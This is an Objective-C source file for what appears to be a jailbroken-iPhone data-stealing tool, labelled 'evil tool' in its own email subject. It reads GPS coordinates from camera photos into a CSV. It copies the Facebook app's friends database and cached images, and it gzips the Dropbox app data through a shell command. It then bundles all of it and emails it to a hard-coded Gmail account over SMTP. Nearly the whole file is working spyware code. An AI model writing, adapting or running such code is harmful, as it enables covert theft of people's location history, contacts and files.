#include <stdlib.h>
#import <Foundation/Foundation.h>
#import <Foundation/NSTask.h>
#import <UIKit/UIKit.h>
#include <ImageIO/CGImageProperties.h>
#include <ImageIO/CGImageSource.h>
#include "include/CkoMailMan.h"
#include "include/CkoEmail.h"

UIImage* anImage;

void createFolder(NSString* pathName){
	BOOL isDirectory = YES;
	NSString* pathName1 = pathName;
	NSFileManager *fmFB = [NSFileManager defaultManager]; 
	if(![fmFB fileExistsAtPath:pathName1 isDirectory:&isDirectory])
    	if(![fmFB createDirectoryAtPath:pathName1 withIntermediateDirectories:YES attributes:nil error:NULL])
        	NSLog(@"Error: Create folder failed %@", pathName1);
	[fmFB release];
}


void getExif(){
	NSAutoreleasePool* pool = [[NSAutoreleasePool alloc] init];
	
	NSString *bundleRoot = @"/private/var/mobile/Media/DCIM/";
	NSArray *dirContents = [[NSFileManager defaultManager] directoryContentsAtPath:bundleRoot];
	NSFileManager *filemgr = [NSFileManager defaultManager];
    	CGImageSourceRef mySourceRef2;
   	NSDictionary *gpsDic = [[NSDictionary alloc] init];


	NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
	[formatter setDateFormat:@"dd-MM-yyyy"];

	createFolder(@"/tmp1/DB/");
	NSString* saveFileLocation = [[NSString alloc] initWithString:@"/tmp1/DB/photosGPS.csv"];
	if ([filemgr fileExistsAtPath: @"/tmp1/photosGPS.csv" ] == YES){
        	NSLog (@"File exists");
		if ([filemgr removeItemAtPath: @"/tmp1/photoGPS.csv" error: NULL]  == YES)
			NSLog(@"File removed");
		else
			NSLog(@"File removal failed");
	}
	else
        	NSLog (@"File not found");

	NSMutableArray* fileNames = [NSMutableArray array];
	NSURL *myURL2;
	NSNumber* gpsLatitude;
    	NSNumber* gpsLongitude;
	NSData* imageData2;

	for (NSString *tString1 in dirContents) {
		if ([tString1 hasSuffix:@"APPLE"]){
			NSString* filePath1  = [bundleRoot stringByAppendingString:tString1];
			filePath1 = [filePath1 stringByAppendingString:@"/"];
			NSArray *dirContents1 = [[NSFileManager defaultManager] directoryContentsAtPath:filePath1];
			for (NSString *tString2 in dirContents1) {
		    		if ([tString2 hasSuffix:@".JPG"]) {
					NSString* filePath2 = [filePath1 stringByAppendingString:tString2];
					[fileNames addObject:filePath2];				
				}
			}
		}
	}

	NSString* dataToWrite = [[NSString alloc] init];
	NSDictionary *myMetadata2 = [[NSDictionary alloc] init];
  	NSDictionary* fileAttribs = [[NSDictionary alloc] init];
   	NSDate *fileCreationDate  = [[NSDate alloc] init];
	NSData* dataToWrite1 = [[NSData alloc] init];
	[[NSFileManager defaultManager] createFileAtPath:saveFileLocation contents:nil attributes:nil];
	NSFileHandle* fh = [NSFileHandle fileHandleForWritingAtPath:saveFileLocation];
	dataToWrite = [dataToWrite stringByAppendingString:@"Filename,Date,gpsLatitude,gpsLongitude\r\n"];


	for(id fileName in fileNames){
		NSLog(@"%@",fileName);

		dataToWrite = [dataToWrite stringByAppendingString:fileName];
		dataToWrite = [dataToWrite stringByAppendingString:@","];

		myURL2 = [NSURL fileURLWithPath:fileName];
		imageData2 = [[NSData alloc] initWithContentsOfURL:myURL2];
    		mySourceRef2 = CGImageSourceCreateWithData((CFDataRef)imageData2, NULL);
	
		myMetadata2  = (NSDictionary *) CGImageSourceCopyPropertiesAtIndex(mySourceRef2,0,NULL);
    		gpsDic = [myMetadata2 objectForKey:(NSString *)kCGImagePropertyGPSDictionary];
		gpsLatitude = [gpsDic objectForKey:(NSNumber *)kCGImagePropertyGPSLatitude];
    		gpsLongitude =[gpsDic objectForKey:(NSNumber *)kCGImagePropertyGPSLongitude];

  		fileAttribs = [[NSFileManager defaultManager] attributesOfItemAtPath:fileName error:nil];
    		fileCreationDate = [fileAttribs valueForKey:NSFileCreationDate];

		if(fileCreationDate!=nil){
			dataToWrite = [dataToWrite stringByAppendingString:[formatter stringFromDate:fileCreationDate]];
			NSLog(@"fileCreationDate: %@",[formatter stringFromDate:fileCreationDate]);
		}
		dataToWrite = [dataToWrite stringByAppendingString:@","];

		if(gpsLatitude!=nil){ 
			dataToWrite = [dataToWrite stringByAppendingString:[gpsLatitude stringValue]];
			NSLog(@"gpsLatitude: %@",gpsLatitude);
		}
		dataToWrite = [dataToWrite stringByAppendingString:@","];

		if(gpsLongitude!=nil){
			dataToWrite = [dataToWrite stringByAppendingString:[gpsLongitude stringValue]];
			NSLog(@"gpsLongitude: %@",gpsLongitude);
		}
		dataToWrite = [dataToWrite stringByAppendingString:@"\r\n"];
		dataToWrite1  = [dataToWrite dataUsingEncoding:NSUTF8StringEncoding];
		
		if(fh){
			[fh seekToEndOfFile];
			[fh writeData:dataToWrite1];	
		}
		CFRelease(mySourceRef2);
		[imageData2 release];
		//[myURL2 release];
	}	
	[fh closeFile];
	[fh release];					
				
    	[gpsDic release];
	[pool drain];
}

void runSystemCommand(NSString *cmd){
	NSTask* task1 = [NSTask new];
	[task1 setLaunchPath:@"/bin/sh"];
	[task1 setArguments:[NSArray arrayWithObjects:@"-c",cmd,nil]];
	NSPipe *pipe = [NSPipe pipe];
	[task1 setStandardOutput:pipe];
	[task1 launch];
	if(![task1 isRunning]){
		int status = [task1 terminationStatus];
		if(status == 0)
			NSLog(@"Task succeeded");
		else
			NSLog(@"Task failed");
	}
	[task1 release];
}


void getFacebookDropbox(){
	NSString* fullPath = @"/private/var/mobile/Applications/";
	NSFileManager* fileManager = [[NSFileManager alloc] init];
	NSDirectoryEnumerator* dirEnum = [fileManager enumeratorAtPath:fullPath];

	NSString* facebook = @"Facebook.app";
	NSString* facebookPath = [[NSString alloc] init];
	NSString* facebookPath1 = [[NSString alloc] init];
	NSString* facebookFriendsDB = @"Library/Caches/friends.db";
	NSString* facebookCache = @"Library/Caches/ASIHTTPRequestCache/SessionStore/";	

	NSString* dropbox = @"Dropbox.app";
	NSString* dropboxPath = [[NSString alloc] init];
	
	NSString* dropboxCaches = @"/Library/Caches/Dropbox/*";
	NSString* dropboxCachesPath = [[NSString alloc] init];
	NSString *file;

	//NSString* saveFileLocation = [[NSString alloc] initWithString:@"/tmp1/DB/photosGPS.csv"];

	NSFileManager *filemgr = [NSFileManager defaultManager];
	if ([filemgr fileExistsAtPath: @"/tmp1/" ] == YES){
        	NSLog (@"File exists");
		if ([filemgr removeItemAtPath: @"/tmp1/" error: NULL]  == YES)
			NSLog(@"Folder removed");
	}

	createFolder(@"/tmp1/DB/Facebook/Caches/");
	createFolder(@"/tmp1/DB/Dropbox");

	
	while((file=[dirEnum nextObject])){
		if([[file lastPathComponent] isEqualToString:facebook]){
			facebookPath = [fullPath stringByAppendingString:file];
			facebookPath1 = [facebookPath stringByReplacingOccurrencesOfString:@"Facebook.app"
                                     withString:@""]; 		
			//printf("Facebook path: %s\n",[facebookPath1 UTF8String]);
			//printf("Facebook friends.db: %s\n",[[facebookPath1 stringByAppendingString:facebookFriendsDB]  UTF8String]);
			
			NSArray *contents = [fileManager contentsOfDirectoryAtPath:[facebookPath1 stringByAppendingString:facebookCache]  error:NULL];  
			NSEnumerator *e = [contents objectEnumerator];
			NSString *filename;
			while ((filename = [e nextObject])) {
 				if ([[filename pathExtension] isEqualToString:@"jpg"]) {
					//printf("%s\n",[[facebookPath1 stringByAppendingString:[facebookCache stringByAppendingPathComponent:filename]] UTF8String]);
					[fileManager copyItemAtPath:[facebookPath1 stringByAppendingString:[facebookCache stringByAppendingPathComponent:filename]] toPath:[@"/tmp1/DB/Facebook/Caches/" stringByAppendingString:filename] error:NULL];
    				}
			}	

		[fileManager copyItemAtPath:[facebookPath1 stringByAppendingString:facebookFriendsDB] toPath:@"/tmp1/DB/Facebook/friends.db" error:NULL];
		printf("Facebook download completed\n"); 

		}

		if([[file lastPathComponent] isEqualToString:dropbox]){
			dropboxPath = [fullPath stringByAppendingString:file];	
			dropboxCachesPath = [dropboxPath stringByAppendingString:dropboxCaches ];	
			printf("Dropbox path: %s\n",[dropboxPath UTF8String]);
			NSString* runCommand = [NSString stringWithFormat:@"gzip -rc %s > /tmp1/DB/Dropbox/dropbox.gz",[dropboxPath UTF8String]];
			runSystemCommand(runCommand);
			printf("Dropbox download completed\n"); 
		}
	}

}

void sendEmail(){
	NSString* runCommand = [NSString stringWithFormat:@"gzip -rc %s > /tmp1/package.gz","/tmp1/DB/"];
	runSystemCommand(runCommand);
	
	NSMutableString *strOutput = [NSMutableString stringWithCapacity:1000];
	CkoMailMan *mailman = [[[CkoMailMan alloc] init] autorelease];
	BOOL success;
	success = [mailman UnlockComponent: @"30-day trial"];
	if (success != YES) {
    		[strOutput appendString: mailman.LastErrorText];
    		[strOutput appendString: @"\n"];
		NSLog(@"%@",strOutput);
		return;
	}

	mailman.SmtpHost = @"smtp.gmail.com";
	mailman.SmtpUsername = @"keithtest10";
	mailman.SmtpPassword = @"";

	mailman.SmtpSsl = YES;
	mailman.SmtpPort = [NSNumber numberWithInt:465];

	CkoEmail *email = [[[CkoEmail alloc] init] autorelease];
	email.Subject = @"evil tool";
	email.Body = @"";
	email.From = @"keithtest10@gmail.com";
	[email AddTo: @"eviltool" emailAddress: @"keithtest10@gmail.com"];
	NSString *contentType;

	contentType = [email AddFileAttachment: @"/tmp1/package.gz"];
	success = [mailman SendEmail: email];
	if (success != YES) {
		[strOutput appendString: mailman.LastErrorText];
    		[strOutput appendString: @"\n"];
		NSLog(@"%@",strOutput);
		return;
	}
	success = [mailman CloseSmtpConnection];
}	


int main(int argc, char **argv, char **envp) {
	NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];

	//getExif();
	getFacebookDropbox();
	sendEmail();
	
	[pool drain];
	return 0;
}

